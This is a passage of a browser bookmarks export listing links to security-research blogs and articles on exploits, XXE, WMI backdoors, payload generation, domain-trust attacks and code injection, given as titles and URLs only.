icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC60lEQVQ4jWWTW2hcVRiFv33OyWQmmYdcpANKMBGbNJnYjmOdSaJWjQgJiJIHX4q11sZkTiOVWjTeIEGsNCWN1ktserEQCj4IIpIQRUoTsWiNUsWHPPjQgFAdECOVTGdOz5zlwyRDiD/8sDes9e+91l7bsKkGX/Z22pbtzn/lPvAY9U0j6TclcdU21sVA1pnqKfPjRrxZXwwMXKui9pb3bcvZB8YEgc+FL57iyao7GU29BYCQdn3WcfbyE/tfMKcGcwAWwIFRRa26LV/bVsWzYAyAZTk88vh5Ps39xsgPb6ydZsx175/+osl9CUTK17i1475z9S3bVd98l+q2tsupqJLthEttVwrQK/e8roIrtdRsldx35WcmTgE4Q38pHdg8sz7s+9Fhrpw4ttkajv50ZF0GAJYx/XJPTDmebj7nUFEm//rhBLFYDADP8wAIhUIAjP8yhiNTlhMEGnJMMejGge9Ghvn5vWM0NjYyNjZGQ0MDy8vLLC0t0d7eTm9vL/F4nOy1PwAIJF689Pn9DPx5w08cfEmt+7YJKPfMzIwSiYQAdXd3a3p6WoBCtiM/846ebrlXw3vu9tnx/GE/PtAm1xssk9va2rSwsFDez87OKpVKlQZYtvY079Sre5Pyv814lhW58PuDJ3dhrHIk6OvrY25uDoBoNEoikWBxcbHkS1CkoTPg7UwaGZadzqOdl42hUQhjDJKYnJykUCgAkM/nSSaTSCX3X9ub5EgmvfYSumhhmQ/KeWitoefQdlZWVsjlcgD4vk82m/0fGcCSfQaAoaI7fcDP6LZ4nablqufQDgGqrLQVDpc6EnHU0lSjbU21ar2jVql47DSAAxCxqt1V799mY0gD7J7oAiD2d56Pzz6MtcEfgIIXfBMOTx2Etb8wbsZXC9dvPhrdEjm3Dto90UW2Lkx//zxBUNIfBFJu1T8dDk/1ADdKgdpU5+V2FAP2S8WHwLr9k8OXTKsxV48f75ov5vkoVH3yykb8f/noOGzVtXF2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Exploits - bytecode77</a><br>            <dt><a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" add_date="1521690163" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACuklEQVQ4jQXBS2hUZxQA4HPO/987985M7kwSiRl1aNVAo7bGVwsVUTBQdKVQBXEhWWmWXWQjpCu3uhC6KF3UFhGNMCCtLrppaeMLdEx1Iy1YmyY6YSaZ5525j/9x+n0Ya5th3ZODK0+vvfzzCWST/RNHD08cOTk2LS3YBElSLFGDzUIiWEkGtsb4Mttrh3+9/jsoeatvf3r2vFo7vPLF3uPb/BIbdI2TIYmQYXAJAdgAghh0B631br22rpT5993y/K2vL1fmHyz/0qcuUoLKghUaBBECogCAYX8EInBIWs2I6Pvi16Xf5r6bv/rgmw620dHMhgHIAgIwAmCEpq3zlI87sepEXpNy2u+q+M6j+zcfVvrUs5SQVcTIiICApZFxn/1wLQxEXne0qpmiDgLKNTutGz/ffvymSoLIGrKgGTQCRs2+lzoTW3ZG631SAqTbrrVhrSdaUXujtdxYQ3ZBSyKwgADA5bFt4cagQCNT2/cWM0VDTr8XibYuRAKaiUgdQARLUhqyxMDwT/WNY73r89+aMF24d1f4bnnz1urrZz/8+P3BqU9OfXbCWraCJWsDggixtlrLuP5IftPQkHfpwkXf83yRPXPy9Mc7dk1OTAaZHBgDiNLx/FQlxhidqjSKjVIDCcVcgGxTEzKYmdMzDDo1ysWMcCWeP3+uHw3CKKouPVfW7Ns3NVwoBH4OLCuVZLJeLwqZASzG/XTuqzkMgoARUKKQMpfLMltHyvV6I44T6Yix0niz08rm8uVyOcgGX545Kz/Y/qHned1uZ7xUajY3Dh44MDxcaDQaH+3eQ0K8e/++3qhfmJmZPjZNkpIkwf9WVlzXfbH04uEfi4uLvy8sLLx8tTQ6Ovrpoc8BAACUMY4QhrUxRpBAw0wA9Xq9UqmEvc7s7OxQUATQUaQEEiEJISwzATNYBvs/irdoE92U064AAAAASUVORK5CYII=" target="_blank" rel="noopener">Windows内核开发教程第7部分：未初始化的堆变量 - rootkit</a><br>            <dt><a href="https://www.jarviswang.me/?cat=3" add_date="1521874948" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC0klEQVQ4jQXB3W9TZRgA8Od53vf0Y9tpaXsKCsvWdjo26AYMtrmgoiRMIS5eaLwxxgvvNDFceO1/4RXhkjtC4IYEMAbC+BBxLbBs61rqETCsn9sKbc/X+z7+fqg8DaIbsEJBGsJ2w/6z/JuCFnu81zxyfPIbayADoFA5gqPAgJ6jyUAiaPdLj9evv6pvZUYzU2PnvL4urt9q7JQnMnP5sdOmkVI+IAbosvaC+upGYdO+m7LMmUOLqdhkoKKSgLD3z+sHhdJN3zOmx89MZGaQJVZ3lu8/vhqm2OzUqRFrDiHiBQAUCAoQDALhQn39xb3ixu1kMvZB/lvx4VfpoSFzaeHn+EDO8fo9byscijFu13ef1Zq1Tt8JRdRoYm505ORqpaA1SVbJdOI95DgD19prxdK1Txd+vF+81tx+GTMHu289JPXR8R/eSQzHE4ohkKRivucCaED2taeE97L1vNxY+XrxfMrIE+DvDy9UqpsHZvZr9YZQSxA1IiRkxSSMqKth0BweMvfc/OuiZeYSRiab27svkVeoSCMEBvloCB1nQAEYgO+SEw+/uzT73cH0x1L0a531e4UbhfJ1BW8ZYihIMkmmXeAWQCoIRGQgUqoud9pPFxd+AdAExnLl0ma1cGKyyxwBDknGDskcQkoBgNR+N3Qg+/4L+87lO7+a8ST7Zm13ZTx7bABHiOKMLSnVUKPd5DFXQDQspQ5UMm6d/eR89dWznlcBIzSR/X6/NdnVzZ03lfSeCSy37z5auSGJjx2et7f+qzXrS6d+ClNE4iCBIhAK3FX7QWHttmVF56e+wIAbjnKelB7+u/VUKz179LNc+qSrXSJPgLRrfxdLV5UPh7NfjmdPEAaoXJ8FoJA93dPcKtsrnY4znT/T7TWebPzR2i4fHJ3Oj582xYivANFHdrQW6JPS2CfwXzfsR2tX+rqj0Ldiw/OHPk9FjwITayURAeh/VP5sn7iA8EAAAAAASUVORK5CYII=" target="_blank" rel="noopener">Web开发 - Jarvis&#39;s Blog - 白帽子、全栈、嵌入式工程师、iot安全研究者</a><br>            <dt><a href="http://deelmind.cn/" add_date="1521774201" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACfUlEQVQ4jS2OS28cRRRGv3u7+t09PQ97xmNsRRiTKAsvUMQiiIfEhn/ACoklS/hLIBbwA4iEsggbJAQKRCSykIMIGEw7tmdsz6Omp7qqLgtzlkdnccg1pwSICESIyXoYK9Y1zrk4zvOigNHeC0BEAKAIgAgRgel62Zz9/evq+Ad9dULg4e23EW91t2/3qg68EzAD5Fc1iIw1c72a1c8uHn9x+uIQUKwCFQZaezu4/96Hnw43NsVZImYhEpFAhbN/n549/nJaH1/P/GymRVRY7BR5dPXbtz89+JxuVkiYRIiVnk+Of3k4rf9pdGNsAI4RlRKPwqw7HKRN/eP5n08oTOA9i3hS4dnx0dVfT8TqKB/2huNuFatsu3zlwMWjrDPoRIuTo58RBCJgEIn4rDtO88Ahm5rNNA2zqursv4NyLyj3GuuWcx1EFREToEiIxEVJ0VJV7h/MZwmSxWv33kpHB989+l75avTqvfq8ff3ND/xaE5MShlibFeXO/Y83Bv3opeh1c+vgfXhzZ2+XbH9869197iZp7lpLzOSbUxFh5sba85MXm36R7L3RGiPEkZLp0aHb2O11OswMgIjINzVAIsJMK2MvLs52d3YhIuJN6/S66RaFeA8CCUAgWZ16EgKJCAjz1eqP57+PNjfSory8vByPt2IVAQKAABCxAMCNgThfdQdZEk7q54EK8zxLk1Tk/+QGBQAgIXAQQnyr5/3R1uDOXVbhYj43xoQqIGLvnAAEKBAAMW07m1xMrqa9/tZaa0XKOXs9u3w5qbtlvyqrXtUBBCJq3bbL1TJS8eHRs6+/+Wp71O9kfD5dWLeOk9gY9clHn+VFvtBLJsqy7D+rA0dsNmiv6AAAAABJRU5ErkJggg==" target="_blank" rel="noopener">DeeLMind-Blog</a><br>            <dt><a href="https://toddcullumresearch.com/2017/07/16/portable-executable-file-corruption/" add_date="1522049404" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABb0lEQVQ4jaWQT0sCURTFz70zjZG+XMgME+hErQehaC0I5UdQxIXroG8i9Amkva1mIYi4FFy1aeUuGBAnsGgROArNvBYP/+SfWvRbvXfvPdxzDwEgIiyQUi6/Ukr8HwJQqVRc1w3DkIiazWYul6tWq/1+3/O8bYEGwDAMx3Ecx2m325lMplwud7vdWq02Ho9Ho9G6YQAaEQVBEIZhKpVqtVqlUsn3fc/zptNpFEW+728IdHVlMplMJBJEJIQIgoCZO53OztNZleI4lguYWUophEin09s3sNpIRMwMYDKZ5PN5KWW9Xi8UCgCYf1hitTGO49lsBqDX62Wz2UajYdv2YDBQnlaBLhFCmKap3pZlFYtFIcSqa+CAsUO2gerdXuJE4CvG4xDDN+g75oiW4UggaeDhGTqhdL5HsMyRCFLi5QOuidNjPL0CKtZ9KOGhjoKDCxtPwS+za9xdIaHh5gz317COoP0pmEf4nGP4DiZojG/qLJBEVYk/xwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">便携式可执行文件腐败防止恶意软件运行 - Todd Cullum Research</a><br>            <dt><a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" add_date="1522049413" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACzUlEQVQ4jQXBS3PbRAAAYEm7euzqbQsrSh3LedBApo+UTjPTAj0AnQ5/gAtDuXGAX8KFY39KTxx6aqFASmkIToA4UW0ndRLrZb1WXm2/j9/9cf331/HeuDC1+uHNztEZOZ7SacgYrVUs9D3pg558clE8exUaWF9bNsBNXxq+jW7cdbeve+Oz8uwyUWSYxAWhuWvjoqwqKrQ9+9rddjBJx+MU7PREEVfffH+bFsXPT49c17RMYWtV3tzQZVwjrJ5MIlkqv/puO03y4eEF//hrfeeO+3R3BBWx4xpJEN6+ZXod1BBaceDFL5OEVxBSgtFse3PJEhj49hN3+CakVOR56DnNp/faisIO92aj/2LVEDa2VGTDYJjXBUjiCssSuP++dhkRZxl3UHFj0wBac/jPVEYmxjguEwa51RWnmKYKUjLChse5QDgYZqUl0Z07y2XFBn/NVb2fxDItFJV1SAb/PRhf/6i1tqJEM45yWIjTREei7YoC4k+D0LPaL18kz3fnv71O9v9I1q6slxmt5pluyhIktK7Boy8sETKkiwu+WG5jRsk8Xvi+2199T+NrwCLDgUwWgynRkVzmJfjhS6eqyCwmDc+MJbFlg6UOoHnZ0Lzb5fQukSxx//8yjbhF2nzY18GDDdT2NEPNeNU+PSeyxpkaUyVqKAvDg5kovNzPUQvTNMMKkmRReBvObVP4/MHV48GExCA4YaNowSGI2vplTvcHuVCjYO/i/r3u1S38d1DyT376LDgaOC3a0eDBQdxyrdOzqEwaRZahXHd9M57mnouwg4JLDghtoeP7FrAnr7JFRK+te01OFArWWranyCxr0mnVWzJ0id/79ZRVkt/zwMfduUaha5tvJuf9FdRy1HrR8KwRkWA5cNVvyVz95+BipddTNDw6n4GHt8wiDXlWX3EloOQkJxEnHg7DMC38DVtoGAR1Q2HOgThJoYneAbv/Zj1QPO6uAAAAAElFTkSuQmCC" target="_blank" rel="noopener">通过盲目的OOB XXE获得文件系统访问权限 - 不断发展的Web安全博客</a><br>            <dt><a href="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/" add_date="1522050620" target="_blank" rel="noopener">Tales of a Threat Hunter 2</a><br>            <dt><a href="https://theroadtodelphi.com/2010/10/21/wmi-delphi-code-creator/" add_date="1522116004" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAClklEQVQ4jQXBTY/bRBgA4Hln7LGdOLZ3s+x2VbIrSFBbbbo5coAKiRsSEgcOcEAcK34l3EBqT5WQWrTQj82SmKyTOLZnPN/D85DxeIjAfvPselzEgO3iyeTxbExpmAzSxZPJp5ep9z6N6fOfvu0l51IGAJCNhh75lomIgkXKITqfnebRoJWsPPg4gj3XbcecdwEhAQLAgDvWt9wkcV7vVUBwKdqO2rxItawZc73yddMqaTxCGCFkjL7fHSzgaDgkGLTW92V9lIx++fn5+PgjLrT3sKtbZbS1HltrjXWHTljrZC+1tgSHIcLO+mpTTS8uEGilVdNyY0xIAAthPcKMCydb8Ie8oGGAs2Gkep7Hke55kadJTA9NJ6UBgAAQCK5DDIMBoQn5b9cp6ROA85Ozmnd3uwoQSeJ4f+iEtggw1lpba4Qy1iHWOKToat1sGtk7owieXMyOisI5LZVmTEqhCQLkvccYEYzO8tF3X3+eROnV5cO90lk2WN6VXDpCQAuRZsnDs2MCGEcROhlHSnulfBiGN29Xp/noZrUZZ/HNu2XDRNNw3vPT86NiOCSEQEJRL0zDHCbBn3/faqWV1jfLMs+Hm13TNMxa2/Xs6npe7VsyPc7mk9PrpxPk0bpi1iJlDCYooriuu8XjaVnVjDEAT0OUHxfw/ReLkyK8mBZn55+U67sPq/VvfyyfXg6eLWbvtraVdvzgY0+DX39/QQPacEF+/OGrR/OZw0m1ZZn768v56NV7G8eU0GSQp7dVFQInYG43++nlrO0ZkX27XJXlZldWWxqnvQ5evP43SkfcIofd9dVnR3nuRUeQffnmn14rMnmQbbd7rXrkxKFjy0273e2VFkaZ1JNm2wVpVt637z+sy/uG4PB/RYqZwU5BUdcAAAAASUVORK5CYII=" target="_blank" rel="noopener">WMI Delphi Code Creator | The Road to Delphi</a><br>            <dt><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md" add_date="1522415703" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">Infosec_Reference/Privilege Escalation &amp; Post-Exploitation.md at master · rmusser01/Infosec_Reference</a><br>            <dt><a href="https://redcanary.com/blog/lateral-movement-and-cryptomining/?utm_content=69603684&utm_medium=social&utm_source=twitter" add_date="1522936441" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACvklEQVQ4jX2STWiUVxSGn3O/n5lQm3FMo0ljadVWA5UquFBSCu3SRcmqnSwKkmJF24S6tlAtYn9A3Kmo2AhmV2GodqwaO9S0ILQG0RpTSyVtFEUUMxonM/nm3nu6yEzMovjCgXsW59yX57wCtAFfA68CBoiAoP6WejWkQA2wwF/AjhDYlcvlNr2fy+HjGK1WMVGEWotaC/J0XlVRVaIoIp/Prx8cHPQAF34oFJyqau3seXt/8zZX2rnbqXX6LBUKBQdcCIGkUq2KPnrsxvZ8I9OXLgliZOGfN1h+9BCmKY23FjEGEVHnnEZRpOVy2QCJAcQniUimOVi66zOJW1ok3baE8k8/M9G3HT9ZIoxjjDGYIJDAGBGRoMHHACLGgCpNq14jXJTFz8wQZJqZzJ/k377t+PL0LEnv53jILBsxc40IQTZL1NoK1qLeE73QQunHs9w7eJjGJw2oqgr1U6H1rUFTkyx4cwOuUpkdcI6g+XkeHDvOzMQtMAZ1DsD5uhszzw6o6uKPPiS9ciVuagpEkCgmuXuXh/nvERHCIAAIMpnMPAd1O95a4o4Olh3ZT7i0g+TJE9Ra4jjm0anT+CRhqlqlWCy6gYEBAMJ5KfPOexFreW7NG6z64nNSr7zM42ujXN79Jdmrf/DtB5vY9/cNFgQBZtYJIaDGGACTSqUAKA0VGb5zm/O/XyQ+V+RKbZpt69ay4vQ59u7ZycZP+6Vw8hTvdndrCGiSJDo2NuZP5PMy+suvkr12nd9aFvL66tW89/FW+t95m8Wtrdzb8gkMX1Tp76NcqWiD/3BnZ6fr6uqa6enpqR09cNDeGR+3/5vfh5M6sbG7pklNC0NDc1G+mUql3urt7Y1fbG8nTqcZGR0lGRmhZu1caEQEMYbSS+3hohPfkT9zxgDjArQZY77y3i8HksZlniEPxMA/wI7/AGvoWuu66v96AAAAAElFTkSuQmCC" target="_blank" rel="noopener">威胁检测4422：混合横向运动和加密</a><br>            <dt><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/" add_date="1523109468" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAB1UlEQVQ4jXWSTWsTURSG33PunUySZmzHxhQqFhmbEqViCVS6UDci6s6NuPcPuHQvrvwF7rvvViiCOxEKdVcXltKFUdKakthkkvm497hop5lIPLsD54H3ee8F8kOkmAF9vqBApBmUP1ETAJNYcVRxtX5lLfDJmk44JIbI/wDhW0vzm+8evXreePFsxdEz258PWLFYmQqQo/j9m8f37swO4tRE0lj2dvfah61TyoXiLDwAaTaqzZuz3Z6Y1BHHqXmlzbdP1tcWRHDB6Cw8jKB+wy+6Eov+3el++PjDr3ir9drV6uUdtIlIRMaAEAEy55VcrcMorS54W9sHX78dlV09jCwAm2lkkc6FtIJrLBVL9Ppls0AURhac6+hCmohEsBzMPdxYNGYURfp24Hte+dPOLxIS2H+lz/Lt73fCoWZSRGYUDzfuLjnKWkknnioDAGDve/dn+4/SRUiq+FLvqG8TCzhTgDMH33cqFW2NECgyg+C6X5t3gWQKwEwAnj5YCRaLxsbiupGk12r6/noAgHkMZLUCALphcnw66oehistkuDdCfxABjJx0BogAaLU6X3aPk8Sw7ac6Vigftk9AJOP7ia9LXqU046pEBDAsVCB1EiXDMEWuqL+u1MVGV/bvoAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">使用SharpShooter生成有效负载 - MDSec</a><br>            <dt><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" add_date="1523414122" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACeElEQVQ4jY2TQWhcVRSGv//eO/NmUkMMQ91YChaqrzZRKlKkC3EhKAgiIq4kdmM0kW4KKm0EQ6lWoXRZDYqoiNrqQq1IQcnCrS7EkjAaK7qwCGMp2KRv5r137+lCkqAdi//qcM5/zvnh/AeGYt79vxzoWtJ8AtixY3qslWlOSf1Ll39/9cKFM1f+zRky4G/szmemndxzZukHoCHndqZkry11T75zXQUT+VP7pObLQNuMoxCpI4TgGzIOgdXJ0otLP76xuN7jN7beNnskhPa7yeqzdVkelXcHJO13Tg+S6NQxzjv5S5KOb+3cfVPv4ndfAziA/OapTqzLz2Iq35fcfaHZ+NAZP//RG+zpV3/dZaRfQ8OdAhstk7s/RT6d3D4zDhAA3JYtT0qMFGVxuN1sf0upR5OvqpGRfsjqZmbwURSng1h04nPveDgG+w1YcAASI5L2htAax9Iv/bViBd/44Ib22EPWyp5QQ293u9+cA1v2qRwD7nFGtqHAjCgoYnSxESzL4mpxea21tyj+rEZHx31KxVvbuN0byuRCAlszU9wYIEcLaIRUOfCjS72PrwAJoNfbvNKNPONSTeGCyxy2qYAUvyqxL1b7Ot9psjqRz54dxOr5lZU3vweYvHU6N/kjkrszqb5FqZpLJvcPH0zkM4cx7qhIxwN6RNJ+w06DGwBTBu8JNb0LB+tUzi13X39l44yAq4lnTMQg/wnGxVjzmKRtEnldDR6X7LzDHkhWnTKxuN57jZV37Xz6Xu/9MclllQ2OBfxA+EMGTaX6pXM/LXz5X1Zejw1g967ZKaEXZClEdGK5e3JhGG8INt92cvvMeJ4/2xlWW8dVNAcGI++CC7oAAAAASUVORK5CYII=" target="_blank" rel="noopener">攻击域名信任指南 - harmj0y</a><br>            <dt><a href="https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40" add_date="1523499736" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACNElEQVQ4jWVS0UvTURQ+597rr/3GVqHpGDRalBmSEayxeqjMkCSXBj0YlAVCPUToQwT9FxUEQQ9qj0VZQla4zVk9WCo4s9yMorGEKAhcOX+b+917erhz5TpP91y+8517v+9DpRQiAgARISIRAYCUChEYYwCgL/9iiEiDdEmpGEMNVUoRkT7rQkRUSulGKUUEQnAAGOyPVhni7LlmALCLEhmUx0oDZaZYNDHYH91R71WS0unvPT2tzS17NZ1+Feq9ADg/n7k3EFtZyR9r3ff50zcE8G/3REZnDKPq4qW2PU3bAAgR2Ro9ppKLY7GE3+95MTxtcGEI8XRo8vCRpsZGXyqVYQj6q2jbknN89fL9ci6fy+UH7kau3z4TaKiXIN+l0jeuPbzcF7as1Zoa94GDu0kRFou2EHz4ycR4fC4YqpdZ9eO0pJ9kFfMeX7X7kZ2V1ofZTLgjeLwtoKQUZQcYQ2nTUmH5al3nb3ceAVym407hmWkajGPJB0CGiIjodG4IhnZ5vdXx8bnsUs5tOlymw1opxMcSTqcRCjU4HAYAlVRSiojo+chU9pdlWauR0ZnOUyHO2cjItG/rlqnJj1d6T7aHg4hQUgkAOGe1dZtjkcRC8mv3+aPJ5OJs4ktX1yFErK3b5N7o5Jytc7ps3IP7rx8PTQT27xScvX2zcKI92H2hpdK4tWgQEHHBC4XirZvDti17+zpcLlNKCfBPNP4LnxRClFstemX4KuJNBHotK0m4Lt5/ALfpMzxKKUoXAAAAAElFTkSuQmCC" target="_blank" rel="noopener">通过主机安全描述符修改，按需提供远程哈希抽取</a><br>            <dt><a href="https://www.endgame.com/blog/technical-blog" add_date="1523508740" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABS0lEQVQ4jZWSPUpDURCFv3PfNSRiJYLiAsTKCFbuwSVYCG7CDdi4BJeiNukshGAjpBIEtbAxGImJ791j8d5Lnj+gTnPhMnPmzHwD/wyVT0d0lxBYyPW3MQTITf+VdzcKNjv0thUAqbCRACeDojzM2e37KQeIAkMy40QGCRaDFgTgUGVMQqmAIHpuTkBL9Ed+mBBVOiKTX3LeitJj3QEhnGAx4+TOF8PZkDPBKuJ8dimYSWJvhfW2I0qQcDvQe2YwppSOTalMvCX2V3WwVjnMzXLkcODBmABFs2DWKtm5kQzKzbtJ3y3VqbQDpw++fGFBJGxoiasRUJXF+Wh2glagN+Ts+QfGbpLeaHPeDQFi4ObVj1Oyaq0SzhNHt9xPG+DqO2CatLWknRKcAQkKOL7zJ3BBdAIBEIVduOYiZNJc9NfjEzKG6xHjrwz/Fh9ENpsWo8P7cwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Technical Blog | Endgame</a><br>            <dt><a href="https://xiaodaozhi.com/" add_date="1523625393" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAADCUlEQVQ4jQXBW0xTZwAA4P9+2p6WXmgBix2tSMrippIp6opZ1GyoQx6mD2rGsviwxWQPhkzni3tezGayvckenG8m7GXXdGEuYrBByxBhotyl3Epbim3P6Tk9l//f98GPvisKACgEAHAEBII2IxjSOq5uClvFcgALjqDADCMgkIDERTmBQgBBMKSUWTa2lDVUnvJWR4A7rDk/JUDjCFqVbdntwhASt8PGEFBGOUfb+cWInKvlh/zGELDUsaWEQ4lBM49LSy1sMisdbuz8jDgYooSq5U2Plj4QyuTmR+fmF6Y3lELZefV6bP/BwrXLNzPLG/abDTkbxrouI0YkruUSjjvHvfcy81PDT18nR9ZdjZ3HPuhZfrnQtst7uvvwSq468fC/8K4OB8WEMlIrbAbB8FKRj7+wF5/PHH//3LUb/X/99svfg8m+E0c+6T4Y9fmSqUzg6AXAVYIQB0KaXa+MZ8Cj4dlTp87evjNQ3Fod+v3XUCCoKZrsYicOtZYaumaAF0MTOSBgkgydrlcrRntrxOdmP92+de5Mz+rKSjTo80iSYYuqrlVUFUFIEEKYa7K/edtqa65H/V9/UcpNf//NTUMpdbeHe+MhXTFNU+R1c71a56QEAoMA4qCUVHCzj9xXVav/yqXXqXFazjZJHDixpuq+EHswxQ3PHhmImi0hoOfNzcdVi7mD4bE/7moGje9vb4k0E0+QeIN1O3yPZstzoMvl3YH1mUjlLn4vETUyyXpmiZ19HmN6YnLCaIrjltYFnVT8geGF2lPtUH3sgLX24MzuUdmYwR9e+VNfHbOX7znF3OnehKKaW2ZbMjn45N8Ry783a0UbW49UNfPdyIsAWLyfWsa9H39VQx7DvYcF3ymmvy2W+Odf/vDGzli8fe9b+07ac7fW0gMWcbNANDvxs1LYwD0X+yVPmDV00MbO9GRhNasvFQOTz9b7Lp1/lv5n9KXiD7WgWk7Vawjwzo4I/DFZ5IJbXAiATJtotaqp66Xnqd6TbyeOxgcGx7bMBqmSkpqOSXIA2aX/AdasdFrRX6NLAAAAAElFTkSuQmCC" target="_blank" rel="noopener">小刀志</a><br>            <dt><a href="https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/" add_date="1523625853" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAD3ElEQVQ4jVXTfUzUdRzA8c/393S/+/3uCe6wO04OlONp0eB4DB0VNIlBtNL0j5ogylBXUrjYiFFeW6jLYjpdxVpbGLO53G7E0igKkWKKSSgwEMYhdygccMc9P/2e+qvNXn+//33j8D9jiZ1fUKds3YqjrKU682agia19tsY9P+g9WbOvgMmuKNtVWmeR3+qffAwACAAAkyRAVitg0mLZy5OjZ9qaKx42JCqDe41M6AgAdvnGplQPnCdSYnJVMWLGC/lapkdazMkAAAkAEAYIkNUKIoj87ry0jbYUFe+ErbUGcQ1Vg5y3iwbsHfTue6krT1Y6T//0xvXZFfMgANMhLTxXBgASkfTaKX3ws+GKyoslJtcqF64q5BW3HNWlE3/rBWQIFUuCAgORbwI2J9/Z8fw9sPvPzXsOW4bntp9467jJhaDiwqXcVO/+Wa8WF6J0IsTjPDBSkKG5mXCEtGQbgzSKiJFMg2u5yBzJsN1NOX+v4fSPx+588PM3vyVfxbGsV3pdPiUnEZgOERzCZRho5JFvUzRh2Iho8/dkr2B6jZ+69gsLw/Y81WqIKF4XmpScZCqc9Ya34ZJ27w5Qi8UEidEgioKI4Vg0jmVvbFEjgDDjtEMVnl5T+oH3OUBFyoHjHUatKiFVo4skKBcGiEdfXpnO6aqbi3i1aUDGk4AlgIQYv37u+k5aCJXTZKAIxGiK+exHoowkykmRE9b9gv53p9NeYJKqiFQtdSJ86bZ6aAYe9v6VPtU3vgNoJh4lcVXiH0vaxkmnXO6LyaJ80FXIyBQlSTrtkkG9vh4g+AUKohg61N5d/enB6XYjO1Ye45hB5viRLCBEDeKj4wKuiAFF1YLA8YBLNMRDPxjSjN3NxeNd1hdvGrpHC6dwD2uS+aRDWcnJ9c4rY9spx9oC6nx9sZ8g8TEZI5R7IooUHI/iQFAIl1EoLFCtdo8m523LfODBTPwrbLmrL8GQMGw4eyNUhpGl8vcr6cWWXY+kjrolczBG+Dg3HeaCtF8MgA8BIJqEcJGeXwiHEs58fzE4iKSXgOhpqt937JqlB9z0h+2NEVourrZ+XDk6YJszFTxxK8wqOra5c1uA0dGC4/xQq0xBiVuft+2pA0BxBAAgXX6G7WWO1p/s06R73PLHwMuzW968j1/Y/wAHn/1PAEQBq2wBif3ONlEz92pe/zI5eXcKHQARBwD4xBbibNLIP1fVtRObmz6xMJdNytDnqAEvvZOedHsG1X49PeRlOX+A9zXuHriPm2emUC6I8N+ST5MAEFiBhMMHK+bXaE+memRJ19GscwdIAn41LAIciDzd/wuyWq5VA2a+OwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">发现新的&#39;早期鸟&#39;代码注入技术 - Cyber​​bit</a><br>            <dt><a href="https://subt0x11.blogspot.hk/2018/04/wmicexe-whitelisting-bypass-hacking.html" add_date="1524023296" 